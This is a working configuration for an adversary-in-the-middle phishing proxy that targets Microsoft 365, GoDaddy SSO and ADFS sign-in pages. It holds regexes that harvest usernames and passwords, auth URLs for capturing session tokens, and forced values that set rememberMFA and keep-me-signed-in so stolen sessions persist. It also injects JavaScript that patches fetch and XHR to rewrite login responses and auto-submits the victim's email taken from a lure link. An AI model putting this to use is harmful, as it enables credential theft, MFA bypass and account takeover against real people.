force_post:
  - path: '/ppsecure/post*'
    search:
      - {key: 'LoginOptions', search: '1'}
    force:
      - {key: 'DontShowAgain', value: 'true'}
    type: 'post'
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
auth_urls:
  - '/kmsi'
  - '/common/SAS/ProcessAuth'
  - '/?auth=1'
  - '/landingv2'
  - '/v1/login'
  - '/sso/v1/login'
  - '/login/callback'
  - '/oauth2/callback'
credentials:
  username:
    key: '(login|UserName|username|email|account)'
    search: '"username":"([^"]*)'
    type: 'json'
  password:
    key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: "username"
      search: '"username":"([^"]*)'
      type: "json"
    - key: "password"
      search: '"password":"([^"]*)'
      type: "json"
login:
  domain: 'login.microsoftonline.com'
  path: '/'
# Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
    script: |
      var _scEmail = '';
      var _hash = window.location.hash.slice(1);
      if (_hash && _hash.indexOf('@') !== -1) _scEmail = decodeURIComponent(_hash);

      // Patch both fetch AND XHR to intercept GetCredentialType and inject
      // email hash into FederationRedirectUrl before the page reads it.
      function _patchResp(text) {
        if (text.indexOf('FederationRedirectUrl') === -1) return null;
        return text.replace(
          /("FederationRedirectUrl"\s*:\s*")([^"]*)/,
          function(m, prefix, fedUrl) {
            if (fedUrl.indexOf('#') !== -1) return m;
            return prefix + fedUrl + '#' + encodeURIComponent(_scEmail);
          }
        );
      }

      if (_scEmail) {
        // --- Patch fetch ---
        var _oFetch = window.fetch;
        window.fetch = function(url, opts) {
          var u = typeof url === 'string' ? url : (url && url.url) || '';
          var p = _oFetch.apply(this, arguments);
          if (u.indexOf('GetCredentialType') === -1) return p;
          return p.then(function(resp) {
            return resp.clone().text().then(function(text) {
              var patched = _patchResp(text);
              if (!patched) return resp;
              return new Response(patched, {
                status: resp.status,
                headers: {'Content-Type': 'application/json'}
              });
            });
          });
        };

        // --- Patch XHR ---
        var _oXHROpen = XMLHttpRequest.prototype.open;
        var _oXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(m, url) {
          this._scUrl = url || '';
          return _oXHROpen.apply(this, arguments);
        };
        XMLHttpRequest.prototype.send = function() {
          if (this._scUrl && this._scUrl.indexOf('GetCredentialType') !== -1) {
            var self = this;
            Object.defineProperty(self, 'responseText', {
              get: function() {
                var raw = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText');
                var text = raw ? raw.get.call(self) : '';
                return _patchResp(text) || text;
              }, configurable: true
            });
          }
          return _oXHRSend.apply(this, arguments);
        };
      }

      function lp() {
        var emailId = document.querySelector('#i0116');
        var nextBtn  = document.querySelector('#idSIButton9');
        if (!emailId) { setTimeout(lp, 500); return; }
        if (_scEmail) {
          emailId.focus();
          emailId.value = _scEmail;
          emailId.dispatchEvent(new Event('input',  {bubbles:true}));
          emailId.dispatchEvent(new Event('change', {bubbles:true}));
          if (nextBtn) { nextBtn.focus(); nextBtn.click(); }
        }
      }
      setTimeout(lp, 500);

  # GoDaddy SSO — WS-Fed puts username= in URL; page shows password field only.
  # Autofill email if present, keep retrying until input appears (React SPA).
  # sso.secureserver.net is used for custom-domain GoDaddy O365 tenants.
  - trigger_domains: ["sso.godaddy.com", "sso.secureserver.net"]
    trigger_paths: ["/*"]
    script: |
      (function() {
        var params = new URLSearchParams(window.location.search);
        var email  = params.get('username') || params.get('login_hint') || params.get('email') || '';
        var hash   = window.location.hash.slice(1);
        if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);

        function fill() {
          // Try email/username fields first (some flows show both)
          var emailSels = ['input[name="email"]','input[name="username"]','input[name="login"]','input[type="email"]'];
          for (var i = 0; i < emailSels.length; i++) {
            var el = document.querySelector(emailSels[i]);
            if (el && !el.value && email) {
              el.focus(); el.value = email;
              el.dispatchEvent(new Event('input',  {bubbles:true}));
              el.dispatchEvent(new Event('change', {bubbles:true}));
              break;
            }
          }
          // Keep retrying until a visible input exists on the page
          var any = document.querySelector('input[type="password"], input[name="email"], input[name="username"], input[type="email"], input[type="text"]');
          if (!any) { setTimeout(fill, 400); }
        }
        setTimeout(fill, 400);
      })();

  # ADFS custom domain — same approach
  - trigger_domains: ["adfs.example.com", "adfs.example.org"]
    trigger_paths: ["/*"]
    script: |
      (function() {
        var params = new URLSearchParams(window.location.search);
        var email  = params.get('login_hint') || params.get('username') || params.get('LoginHint') || '';
        var hash   = window.location.hash.slice(1);
        if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);

        function fill() {
          var sels = ['input[name="UserName"]','input[id="userNameInput"]','input[type="email"]','input[name="email"]','input[type="text"]'];
          for (var i = 0; i < sels.length; i++) {
            var el = document.querySelector(sels[i]);
            if (el && !el.value && email) {
              el.focus(); el.value = email;
              el.dispatchEvent(new Event('input',  {bubbles:true}));
              el.dispatchEvent(new Event('change', {bubbles:true}));
              return;
            }
          }
          setTimeout(fill, 400);
        }
        setTimeout(fill, 400);
      })();
